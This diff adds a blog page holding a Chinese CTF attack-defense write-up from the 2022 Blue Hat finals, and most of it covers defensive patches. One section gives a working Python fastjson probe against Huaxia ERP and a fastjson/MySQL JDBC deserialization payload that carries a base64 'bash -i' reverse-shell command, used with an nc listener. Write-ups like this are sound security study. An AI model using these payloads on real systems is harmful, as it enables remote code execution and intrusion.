@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>2022蓝帽决赛部分WP（awdp） | A10ng_&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。 摸了个21名， 安全的系统 操作内容： 防御： 打开发现题目中config.p">
+<meta name="author" content="admin">
+<link rel="canonical" href="https://a10nggg.github.io/archives/370/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://a10nggg.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://a10nggg.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://a10nggg.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://a10nggg.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://a10nggg.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://a10nggg.github.io/archives/370/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="2022蓝帽决赛部分WP（awdp）" />
+<meta property="og:description" content="web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。 摸了个21名， 安全的系统 操作内容： 防御： 打开发现题目中config.p" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://a10nggg.github.io/archives/370/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-09-22T15:43:55+00:00" />
+<meta property="article:modified_time" content="2022-09-22T15:43:55+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="2022蓝帽决赛部分WP（awdp）"/>
+<meta name="twitter:description" content="web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。 摸了个21名， 安全的系统 操作内容： 防御： 打开发现题目中config.p"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://a10nggg.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "2022蓝帽决赛部分WP（awdp）",
+      "item": "https://a10nggg.github.io/archives/370/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2022蓝帽决赛部分WP（awdp）",
+  "name": "2022蓝帽决赛部分WP（awdp）",
+  "description": "web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。 摸了个21名， 安全的系统 操作内容： 防御： 打开发现题目中config.p",
+  "keywords": [
+    
+  ],
+  "articleBody": "web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。\n摸了个21名，\n安全的系统 操作内容： 防御： 打开发现题目中config.php里原来就有加过滤，于是试着加了更多的过滤规则进去，刚开始防没有防御成功，后来就加了一个通防脚本，包含之后传进去两个文件，就防御住了。\nfish 操作内容： 防御： 防御\n代码审计一下，发现了在db.php里原来就有加上的防御正则，于是就多给他加一些，让他更安全，传上去之后就防御成功了。\nfunction waf($s){ if (preg_match(\"/select|flag|union|\\\\\\\\$|\\\u0026#039;|\\\"|--|#|\\\\0|into|alert|img|prompt|set|/\\*|\\x09|\\x0a|\\x0b|\\x0c|\\0x0d|\\xa0|\\%|\\\u003c|\\\u003e|\\^|\\x00|\\#|\\x23|[0-9]|file|\\=|or|\\x7c|select|and|flag|into|where|\\x26|\\\u0026#039;|\\\"|union|\\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\\\u0026|\\*|\\.|/is\",$s)||strlen($s)\u003e50){ header(\"Location: /\"); die(); } } 赌怪 操作内容： 防御： 拿到源码是个jar的源码，一般java题漏洞都出现在依赖里，查看pom.xml,发现里面的fastjson是1.2.55的，总所周知，这个版本肯定是存在漏洞的，把依赖的版本修改为新版本1.2.83，然后再maven打包，就防御成功了。\n攻击\n在查看pom.xml的时候发现了源码为华夏ERP，我记得我好像是有这个poc的，于是everything搜了一下，果然有\n然后打开md，在里面得到python写的poc，原来里面的ascii导致出现编码问题会报错，\n改成utf-8就好了。\nimport socket,sys,re def SendGet(res,ip,port): request = re.sub(\u0026#039;[\\r\\n]\u0026#039;,\u0026#039;\\r\\n\u0026#039;,res) port = int(port) sock = socket.socket() # 建立socket sock.connect((ip, port)) # 远程连接 sock.send(request.encode(\u0026#039;utf-8’)) # 向socket发送数据，此处原为ascii response = b\u0026#039;\u0026#039; chunk = sock.recv(4096) # 从socket接收数据 print(chunk.decode()) def main(ip,port,dnslog): test = \u0026#039;{\"@type\":\"java.net.Inet4Address\",\"val\":\"\u0026#039;+ dnslog +\u0026#039;\"}\u0026#039; test = test.encode(\u0026#039;utf-8\u0026#039;) test = \u0026#039;\u0026#039;.join(\u0026#039;%{:02X}\u0026#039;.format(x) for x in test) res = \u0026#039;\u0026#039;\u0026#039;GET /a.css/../depotHead/list?search={data}\u0026tPage=1\u0026pageSize=10 HTTP/1.1 Host: {host} Accept: application/json, text/javascript, */*; q=0.01 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47 X-Requested-With: XMLHttpRequest Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5 Connection: close \u0026#039;\u0026#039;\u0026#039;.format(data=test,host=ip+\u0026#039;:\u0026#039;+port) #print(res) SendGet(res,ip,port) main(sys.argv[1],sys.argv[2],sys.argv[3]) 用dnslog探测，接收到了请求，说明是确实存在漏洞。但是这个依赖非常少，试了一些链子都没有打通，突然想起来之前看过帖子，mysql也是可以打反序列化的，\n查看依赖为mysql-connector-java-5.1.30.jar，版本为5.1.30，确实可以打反序列化，再次用mysql的poc进行探测。\n{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"xxx.dnslog.cn\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_ _bash -c {echo,xxx}|{base64,-d}|{bash,-i}\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } } Dnslog再次收到请求，说明可以打。\n于是在vps上开启nc监听，另一边开启MySQL_Fake_Server，MySQL_Fake_Server是用的ysoserial生成的payload，所以再放一个ysoserial进去就可以了，将反弹shell命令base64编码后放入位置。\n最终poc：\n{ \"name\": { \"@type\": \"java.lang.AutoCloseable\", \"@type\": \"com.mysql.jdbc.JDBC4Connection\", \"hostToConnectTo\": \"1.1.1.1\", \"portToConnectTo\": 3306, \"info\": { \"user\": \"yso_(此处为预留爆破的位置)_bash -c {echo,xxxx}|{base64,-d}|{bash,-i}\", \"password\": \"pass\", \"statementInterceptors\": \"com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor\", \"autoDeserialize\": \"true\", \"NUM_HOSTS\": \"1\" }, \"databaseToConnectTo\": \"dbname\", \"url\": \"\" } } 最开始根据依赖一个一个链子去对比，对了半天没找到可利用的链子，后来我就把包放到bp，把ysoserial的链子名做成字典，进行爆破，点击攻击之后就收到反弹shell。\n然后在根目录下拿到flag。\nflag值：\nflag{289b8f9f-92cf-4f2a-b2b7-0d445fe90cda}\ndiff 操作内容： 防御： 1、将下载好的文件拖入ubuntu中，checksec命令查看保护\n3、将launcher文件拖入64位IDA，找到main函数用F5反编译查看代码\n4、在main函数中找到sub_1566函数，发现buf处有栈溢出\n5、用Tab键返回汇编页面，找到buf栈溢出所在位置\n6、选择Edit–\u003ePatch program–\u003eAssemble将溢出值改为栈范围内，然后选择Apply patches to input file保存已修改的文件\n7、最后再看一下sub_1566函数发现buf栈溢出处已被修改到栈范围内，将修改好的文件和update.sh文件打包上传验证，防御成功，如图所示为update.sh文件内容\n杀猪盘 操作内容： 防御： 1、直接工具patch就防御成功。\nmvm 操作内容： 防御 1、直接工具patch就防御成功。\n",
+  "wordCount" : "1491",
+  "inLanguage": "en",
+  "datePublished": "2022-09-22T15:43:55Z",
+  "dateModified": "2022-09-22T15:43:55Z",
+  "author":{
+    "@type": "Person",
+    "name": "admin"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://a10nggg.github.io/archives/370/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "A10ng_'s Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://a10nggg.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://a10nggg.github.io/" accesskey="h" title="A10ng_&#39;s Blog (Alt + H)">A10ng_&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://a10nggg.github.io/" title="首页">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/posts/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/categories/" title="分类">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/tags/" title="标签">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/about/" title="关于">
+                    <span>关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://a10nggg.github.io/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      2022蓝帽决赛部分WP（awdp）
+    </h1>
+    <div class="post-meta"><span title='2022-09-22 15:43:55 +0000 +0000'>September 22, 2022</span>&nbsp;·&nbsp;admin
+
+</div>
+  </header> 
+  <div class="post-content"><p>web出得有点晚了，早点就好了，为啥每次打ap都只能出一个web。。。<br>
+摸了个21名，<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215430614.png" alt="file"  />
+</p>
+<h2 id="安全的系统">安全的系统<a hidden class="anchor" aria-hidden="true" href="#安全的系统">#</a></h2>
+<h3 id="操作内容">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容">#</a></h3>
+<h4 id="防御">防御：<a hidden class="anchor" aria-hidden="true" href="#防御">#</a></h4>
+<p>打开发现题目中config.php里原来就有加过滤，于是试着加了更多的过滤规则进去，刚开始防没有防御成功，后来就加了一个通防脚本，包含之后传进去两个文件，就防御住了。<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215305015.png" alt="file"  />
+</p>
+<h2 id="fish">fish<a hidden class="anchor" aria-hidden="true" href="#fish">#</a></h2>
+<h3 id="操作内容-1">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容-1">#</a></h3>
+<h4 id="防御-1">防御：<a hidden class="anchor" aria-hidden="true" href="#防御-1">#</a></h4>
+<p>防御<br>
+代码审计一下，发现了在db.php里原来就有加上的防御正则，于是就多给他加一些，让他更安全，传上去之后就防御成功了。</p>
+<pre><code>function waf($s){
+  if (preg_match(&quot;/select|flag|union|\\\\$|\&amp;#039;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&amp;#039;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;,$s)||strlen($s)&gt;50){
+    header(&quot;Location: /&quot;);
+    die();
+  }
+}
+</code></pre>
+<h2 id="赌怪">赌怪<a hidden class="anchor" aria-hidden="true" href="#赌怪">#</a></h2>
+<h3 id="操作内容-2">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容-2">#</a></h3>
+<h4 id="防御-2">防御：<a hidden class="anchor" aria-hidden="true" href="#防御-2">#</a></h4>
+<p>拿到源码是个jar的源码，一般java题漏洞都出现在依赖里，查看pom.xml,发现里面的fastjson是1.2.55的，总所周知，这个版本肯定是存在漏洞的，把依赖的版本修改为新版本1.2.83，然后再maven打包，就防御成功了。<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215320669.png" alt="file"  />
+</p>
+<p>攻击<br>
+在查看pom.xml的时候发现了源码为华夏ERP，我记得我好像是有这个poc的，于是everything搜了一下，果然有<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215321393.png" alt="file"  />
+<br>
+然后打开md，在里面得到python写的poc，原来里面的ascii导致出现编码问题会报错，<br>
+改成utf-8就好了。</p>
+<pre><code>import socket,sys,re
+
+def SendGet(res,ip,port):
+    request = re.sub(&amp;#039;[\r\n]&amp;#039;,&amp;#039;\r\n&amp;#039;,res)
+    port = int(port)
+    sock = socket.socket()   # 建立socket
+    sock.connect((ip, port))    # 远程连接
+    sock.send(request.encode(&amp;#039;utf-8’))  # 向socket发送数据，此处原为ascii
+    response = b&amp;#039;&amp;#039;   
+    chunk = sock.recv(4096)    # 从socket接收数据
+    print(chunk.decode())
+def main(ip,port,dnslog):
+    test = &amp;#039;{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;&amp;#039;+ dnslog +&amp;#039;&quot;}&amp;#039;
+    test = test.encode(&amp;#039;utf-8&amp;#039;)
+    test = &amp;#039;&amp;#039;.join(&amp;#039;%{:02X}&amp;#039;.format(x) for x in test)
+    res = &amp;#039;&amp;#039;&amp;#039;GET /a.css/../depotHead/list?search={data}&amp;tPage=1&amp;pageSize=10 HTTP/1.1
+Host: {host}
+Accept: application/json, text/javascript, */*; q=0.01
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 11_0_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.67 Safari/537.36 Edg/87.0.664.47
+X-Requested-With: XMLHttpRequest
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6,pl;q=0.5
+Connection: close
+
+&amp;#039;&amp;#039;&amp;#039;.format(data=test,host=ip+&amp;#039;:&amp;#039;+port)
+    #print(res)
+    SendGet(res,ip,port)
+main(sys.argv[1],sys.argv[2],sys.argv[3])
+</code></pre>
+<p>用dnslog探测，接收到了请求，说明是确实存在漏洞。但是这个依赖非常少，试了一些链子都没有打通，突然想起来之前看过帖子，mysql也是可以打反序列化的，<br>
+查看依赖为mysql-connector-java-5.1.30.jar，版本为5.1.30，确实可以打反序列化，再次用mysql的poc进行探测。</p>
+<pre><code>{ &quot;name&quot;: { &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;xxx.dnslog.cn&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: { &quot;user&quot;: &quot;yso_    _bash -c {echo,xxx}|{base64,-d}|{bash,-i}&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; }, &quot;databaseToConnectTo&quot;: &quot;dbname&quot;, &quot;url&quot;: &quot;&quot; } }
+</code></pre>
+<p>Dnslog再次收到请求，说明可以打。<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215352768.png" alt="file"  />
+<br>
+于是在vps上开启nc监听，另一边开启MySQL_Fake_Server，MySQL_Fake_Server是用的ysoserial生成的payload，所以再放一个ysoserial进去就可以了，将反弹shell命令base64编码后放入位置。</p>
+<p>最终poc：</p>
+<pre><code>{ &quot;name&quot;: { &quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;com.mysql.jdbc.JDBC4Connection&quot;, &quot;hostToConnectTo&quot;: &quot;1.1.1.1&quot;, &quot;portToConnectTo&quot;: 3306, &quot;info&quot;: { &quot;user&quot;: &quot;yso_(此处为预留爆破的位置)_bash -c {echo,xxxx}|{base64,-d}|{bash,-i}&quot;, &quot;password&quot;: &quot;pass&quot;, &quot;statementInterceptors&quot;: &quot;com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&quot;, &quot;autoDeserialize&quot;: &quot;true&quot;, &quot;NUM_HOSTS&quot;: &quot;1&quot; }, &quot;databaseToConnectTo&quot;: &quot;dbname&quot;, &quot;url&quot;: &quot;&quot; } }
+</code></pre>
+<p><img loading="lazy" src="/uploads/2022/09/2022092215351990.png" alt="file"  />
+<br>
+最开始根据依赖一个一个链子去对比，对了半天没找到可利用的链子，后来我就把包放到bp，把ysoserial的链子名做成字典，进行爆破，点击攻击之后就收到反弹shell。<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215351259.png" alt="file"  />
+<br>
+然后在根目录下拿到flag。<br>
+flag值：<br>
+<code>flag{289b8f9f-92cf-4f2a-b2b7-0d445fe90cda}</code></p>
+<h2 id="diff">diff<a hidden class="anchor" aria-hidden="true" href="#diff">#</a></h2>
+<h3 id="操作内容-3">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容-3">#</a></h3>
+<h4 id="防御-3">防御：<a hidden class="anchor" aria-hidden="true" href="#防御-3">#</a></h4>
+<p>1、将下载好的文件拖入ubuntu中，checksec命令查看保护<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215353799.png" alt="file"  />
+<br>
+3、将launcher文件拖入64位IDA，找到main函数用F5反编译查看代码<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215354363.png" alt="file"  />
+<br>
+4、在main函数中找到sub_1566函数，发现buf处有栈溢出<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215354997.png" alt="file"  />
+<br>
+5、用Tab键返回汇编页面，找到buf栈溢出所在位置<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215355315.png" alt="file"  />
+<br>
+6、选择Edit&ndash;&gt;Patch program&ndash;&gt;Assemble将溢出值改为栈范围内，然后选择Apply patches to input file保存已修改的文件<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215355852.png" alt="file"  />
+<br>
+7、最后再看一下sub_1566函数发现buf栈溢出处已被修改到栈范围内，将修改好的文件和update.sh文件打包上传验证，防御成功，如图所示为update.sh文件内容<br>
+<img loading="lazy" src="/uploads/2022/09/2022092215360296.png" alt="file"  />
+</p>
+<h2 id="杀猪盘">杀猪盘<a hidden class="anchor" aria-hidden="true" href="#杀猪盘">#</a></h2>
+<h3 id="操作内容-4">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容-4">#</a></h3>
+<h4 id="防御-4">防御：<a hidden class="anchor" aria-hidden="true" href="#防御-4">#</a></h4>
+<p>1、直接工具patch就防御成功。</p>
+<h2 id="mvm">mvm<a hidden class="anchor" aria-hidden="true" href="#mvm">#</a></h2>
+<h3 id="操作内容-5">操作内容：<a hidden class="anchor" aria-hidden="true" href="#操作内容-5">#</a></h3>
+<h4 id="防御-5">防御<a hidden class="anchor" aria-hidden="true" href="#防御-5">#</a></h4>
+<p>1、直接工具patch就防御成功。</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://a10nggg.github.io/">A10ng_&#39;s Blog</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+</body>
+
+</html>
